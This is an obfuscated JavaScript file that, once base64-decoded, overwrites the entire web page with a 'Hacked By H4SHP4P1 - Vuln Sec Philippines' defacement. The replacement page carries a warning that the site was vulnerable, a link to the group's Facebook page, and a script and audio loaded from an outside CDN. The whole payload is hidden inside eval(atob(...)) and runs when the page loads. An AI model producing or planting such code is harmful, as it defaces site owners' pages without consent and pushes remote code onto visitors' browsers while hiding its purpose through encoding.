eval(atob('ZG9jdW1lbnQub3BlbigpO2RvY3VtZW50LndyaXRlKCI8IURPQ1RZUEUgaHRtbD5cbjxodG1sPlxuPGhlYWQ+XG4gIDx0aXRsZT5IYWNrZWQgQnkgSDRTSFA0UDEgLSBWdWxuIFNlYyBQaGlsaXBwaW5lczwvdGl0bGU+XG4gIDxtZXRhIGNoYXJzZXQ9XCJVVEYtOFwiLz5cbiAgPG1ldGEgbmFtZT1cImF1dGhvclwiIGNvbnRlbnQ9XCJINFNIUDRQMVwiLz5cbiAgPG1ldGEgbmFtZT1cInZpZXdwb3J0XCIgY29udGVudD1cIndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjBcIi8+XG4gIDxtZXRhIG5hbWU9XCJkZXNjcmlwdGlvblwiIGNvbnRlbnQ9XCJUaGlzIHNpdGUgd2FzIHZ1bG5lcmFibGUuIE5vIGhhcm0gZG9uZSDigJQgYnV0IG90aGVycyBtYXkgbm90IGJlIHNvIGtpbmQuIFN0cmVuZ3RoZW4geW91ciBkZWZlbnNlcyBiZWZvcmUgaXTigJlzIHRvbyBsYXRlLlwiLz5cbiAgPG1ldGEgcHJvcGVydHk9XCJvZzp0aXRsZVwiIGNvbnRlbnQ9XCJIYWNrZWQgQnkgSDRTSFA0UDEgLSBWdWxuIFNlYyBQaGlsaXBwaW5lc1wiLz5cbiAgPG1ldGEgbmFtZT1cImtleXdvcmRzXCIgY29udGVudD1cIkg0U0hQNFAxIC0gVnVsbiBTZWMgUGhpbGlwcGluZXMsIEhhY2tlZCBCeSBINFNIUDRQMSwgaGFja2VkIGJ5IEg0U0hQNFAxLCBoYXhvciB1cGxvYWRlciwgaGF4b3Igc2NyaXB0IGRlZmFjZSBnZW5lcmF0b3IsIG5hdGhhbiBwcmluc2xleSwgbXIucHJpbnMsIHByaW5zaCwgaGFja2VkIGJ5LCBoYXhvciBteSBpZFwiLz5cbiAgPG1ldGEgcHJvcGVydHk9XCJvZzppbWFnZVwiIGNvbnRlbnQ9XCJodHRwczovL2Nkbi5wcmluc2guY29tL2RhdGEtMS9pbWFnZXMvTmF0aGFuUHJpbnNsZXktYm95LXNhZC5naWZcIi8+XG4gIDxtZXRhIHByb3BlcnR5PVwib2c6dHlwZVwiIGNvbnRlbnQ9XCJ3ZWJzaXRlXCIvPlxuICA8bWV0YSBwcm9wZXJ0eT1cIm9nOnNpdGVfbmFtZVwiIGNvbnRlbnQ9XCJIYXhvciBVcGxvYWRlclwiLz5cbiAgPGxpbmsgcmVsPVwic2hvcnRjdXQgaWNvblwiIHR5cGU9XCJpbWFnZS94LWljb25cIiBocmVmPVwiaHR0cHM6Ly9jZG4ucHJpbnNoLmNvbS9kYXRhLTEvaW1hZ2VzL05hdGhhblByaW5zbGV5LWJveS1zYWQuZ2lmXCIvPlxuICA8bGluayByZWw9XCJzdHlsZXNoZWV0XCIgdHlwZT1cInRleHQvY3NzXCIgaHJlZj1cImh0dHBzOi8vY2RuLnByaW5zaC5jb20vTmF0aGFuUHJpbnNsZXktdGV4dHN0eWxlL25wcmluc2gtc3RleHQuY3NzXCIvPlxuXG4gIDxzdHlsZT5cbiAgICBib2R5IHtcbiAgICAgIGJhY2tncm91bmQ6IHVybChcImh0dHBzOi8vY2RuLnByaW5zaC5jb20vZGF0YS0xL2ltYWdlcy9OYXRoYW5Qcmluc2xleS1zdGFyLmdpZlwiKSBuby1yZXBlYXQgY2VudGVyIGNlbnRlciBmaXhlZDtcbiAgICAgIGJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlO1xuICAgICAgZm9udC1mYW1pbHk6IFRpbWVzIE5ldyBSb21hbjtcbiAgICAgIG1hcmdpbi10b3A6IDM1cHg7XG4gICAgfVxuICAgIGgxLCBoMiB7IG1hcmdpbi10b3A6IC4zZW07IG1hcmdpbi1ib3R0b206IC4zZW07IH1cbiAgICBoMS5ucHJpbnNsZXl5IHsgY29sb3I6ICNkYmQ5ZDk7IH1cbiAgICBoMiB7IGNvbG9yOiAjZGJkOWQ5OyB9XG4gICAgcC5tZXNzYWdlX3ByaW5zbGV5IHtcbiAgICAgIGNvbG9yOiAjZGJkOWQ5O1xuICAgICAgbWFyZ2luLXRvcDogLjI1ZW07XG4gICAgICBtYXJnaW4tYm90dG9tOiAuMjVlbTtcbiAgICAgIGZvbnQtc2l6ZTogMTZweDtcbiAgICB9XG4gICAgLmh1YnVuZ2lfcHJpbnNoIHsgY29sb3I6ICMwMGViMDA7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgfVxuICAgIC5odWJ1bmdpX3ByaW5zaDpob3ZlciB7IGNvbG9yOiByZWQ7IH1cbiAgICAub3RoZXJtZXNfbnByaW5zaCB7IGNvbG9yOiAjZGJkOWQ5OyBmb250LXNpemU6IDE2cHg7IH1cbiAgICBtYXJxdWVlLmZvb25hdGhhblByaW5zbGV5IHtcbiAgICAgIHBvc2l0aW9uOiBmaXhlZDtcbiAgICAgIHdpZHRoOiAxMDAlO1xuICAgICAgYm90dG9tOiAwcHg7XG4gICAgICBmb250LWZhbWlseTogVGFob21hO1xuICAgICAgaGVpZ2h0OiAyMHB4O1xuICAgICAgY29sb3I6IHdoaXRlO1xuICAgICAgbGVmdDogMHB4O1xuICAgICAgYm9yZGVyLXRvcDogMnB4IHNvbGlkIGRhcmtyZWQ7XG4gICAgICBwYWRkaW5nOiA1cHg7XG4gICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwO1xuICAgIH1cbiAgPC9zdHlsZT5cbjwvaGVhZD5cblxuPGJvZHk+XG4gIDxjZW50ZXI+XG4gICAgPGltZyBzcmM9XCJodHRwczovL2Nkbi5wcmluc2guY29tL2RhdGEtMS9pbWFnZXMvTmF0aGFuUHJpbnNsZXktYm95LXNhZC5naWZcIiBzdHlsZT1cIndpZHRoOiAyMCVcIj5cbiAgICA8aDEgY2xhc3M9XCJucHJpbnNsZXl5IG5wcmluc2xleS10ZXh0LXJhaW5ib3dhblwiIHN0eWxlPVwiZm9udC1zaXplOjMycHg7XCI+SGFja2VkIEJ5IEg0U0hQNFAxPC9oMT5cbiAgICA8aDIgc3R5bGU9XCJmb250LXNpemU6MjRweDtcIiBjbGFzcz1cIm5wcmluc2xleS1kZXRheHRcIj5WdWxuIFNlYyBQaGlsaXBwaW5lczwvaDI+XG4gICAgPHAgY2xhc3M9XCJtZXNzYWdlX3ByaW5zbGV5IG5wcmluc2xleS10ZXh0LWdsaXRjaGFuXCI+XG4gICAgICBUaGlzIHNpdGUgd2FzIHZ1bG5lcmFibGUuIE5vIGhhcm0gZG9uZSDigJQgYnV0IG90aGVycyBtYXkgbm90IGJlIHNvIGtpbmQuIFN0cmVuZ3RoZW4geW91ciBkZWZlbnNlcyBiZWZvcmUgaXTigJlzIHRvbyBsYXRlLlxuICAgIDwvcD5cbiAgICA8aHIvPlxuICAgIDxwIHN0eWxlPVwiZm9udC1zaXplOjE0cHg7XCIgY2xhc3M9XCJucHJpbnNsZXktdGV4dCBucHJpbnNsZXktYmx1cmVcIj5cbiAgICAgIDxhIGNsYXNzPVwiaHVidW5naV9wcmluc2hcIiBocmVmPVwiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Z1bG5zZWMubGVnaW9uXCI+RmFjZWJvb2tAVnVsbnNlYyBMZWdpb248L2E+XG4gICAgPC9wPlxuICAgIDxwIGNsYXNzPVwib3RoZXJtZXNfbnByaW5zaCBuYXRoYW4tcHJpbnNsZXlfbm9uZVwiPjwvcD5cblxuICAgIDxhdWRpbyBpZD1cImJnbXVzaWNcIiBhdXRvcGxheSBsb29wIG11dGVkPlxuICAgICAgPHNvdXJjZSBzcmM9XCJodHRwczovL2Nkbi5wcmluc2guY29tL2RhdGEtMS9tcDMvc2lhX3Vuc3RvcHBhYmxlLm1wM1wiIHR5cGU9XCJhdWRpby9tcGVnXCI+XG4gICAgPC9hdWRpbz5cblxuICAgIDxtYXJxdWVlIGNsYXNzPVwiZm9vbmF0aGFuUHJpbnNsZXlcIj5cbiAgICAgIDxiIHN0eWxlPVwiY29sb3I6ICNkYmQ5ZDk7Zm9udC1zaXplOjE2cHg7XCIgY2xhc3M9XCJucHJpbnNsZXktdGV4dC1yZWRhblwiPlRoaXMgaXMgb25seSBhIHdhcm5pbmchPC9iPlxuICAgIDwvbWFycXVlZT5cbiAgPC9jZW50ZXI+XG5cbiAgPHNjcmlwdCBzcmM9XCJodHRwczovL2Nkbi5wcmluc2guY29tL05hdGhhblByaW5zbGV5LWVmZmVjdC9lZmVrLXNhbGp1LmpzXCIgdHlwZT1cInRleHQvamF2YXNjcmlwdFwiPjwvc2NyaXB0PlxuXG4gIDxzY3JpcHQ+XG4gICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcihcImNsaWNrXCIsIGZ1bmN0aW9uKCkge1xuICAgICAgdmFyIG11c2ljID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoXCJiZ211c2ljXCIpO1xuICAgICAgbXVzaWMubXV0ZWQgPSBmYWxzZTtcbiAgICAgIG11c2ljLnBsYXkoKTtcbiAgICB9LCB7IG9uY2U6IHRydWUgfSk7XG4gIDwvc2NyaXB0PlxuPC9ib2R5PlxuPC9odG1sPlxuIik7ZG9jdW1lbnQuY2xvc2UoKTs='));
